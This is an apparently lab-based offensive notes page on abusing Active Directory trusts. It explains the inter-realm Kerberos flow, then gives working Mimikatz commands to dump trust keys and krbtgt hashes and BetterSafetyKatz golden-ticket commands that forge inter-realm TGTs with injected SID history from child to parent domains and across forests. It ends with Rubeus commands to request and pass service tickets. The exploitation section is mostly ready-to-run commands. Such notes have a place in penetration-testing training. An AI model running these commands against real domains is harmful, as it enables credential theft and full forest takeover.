# Trusts

## Trust Flow

The Diagram below shows how Client from trusted domain can ask for access to other Domain's service.\\

We can see that in order to allow access to the service hosted on Domain B, a TGT is returned within a TGS-REP signed with the Inter-Realm Trust Key.

<img src="../../.gitbook/assets/file.excalidraw (2).svg" alt="" class="gitbook-drawing">

## Exploitation

It is possible to exploit the TGS REQ (marked red in the diagram above) by forging new TGT using the trust key. (SIDHistory)

### Get the trust key

The trust key is required to forge the Inter-Realm TGT.

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

### Forge the Inter-Realm TGT

Note that krbtgt can be used instead of the trust key.

{% code overflow="wrap" %}
```powershell
# Child to parent 
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<current_domain_sid> /sids:<sid_to_inject> /rc4:<trust_key> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

# Using krbtgt hash - No need to request for tgs later
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# Across Forest
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit" 
```
{% endcode %}

| Options   | Description                                      |
| --------- | ------------------------------------------------ |
| /domain:  | FQDN of the current domain                       |
| /sid:     | SID of the current domain                        |
| /sids     | SID to be injected to the SID history            |
| /rc4:     | RC4 of the trust key                             |
| /krbtgt:  | krbtgt hash can be used instead of the Trust Key |
| /user:    | User to impersonate                              |
| /service: | Target service in the parent domain              |
| /target:  | FQDN of the parent domain                        |
| /ticket   | Path to save the ticket                          |

{% code overflow="wrap" %}
```powershell
# Same can be done with Rubeus
Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash> /sid:<sid> /sids:<sids> /ldap /user:Administrator /nowrap
```
{% endcode %}

### Request the TGS and pass it

{% code overflow="wrap" %}
```powershell
# Forge the ticket
Rubeus.exe asktgs /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
```
{% endcode %}

After that any attack can be performed according to the service requested.
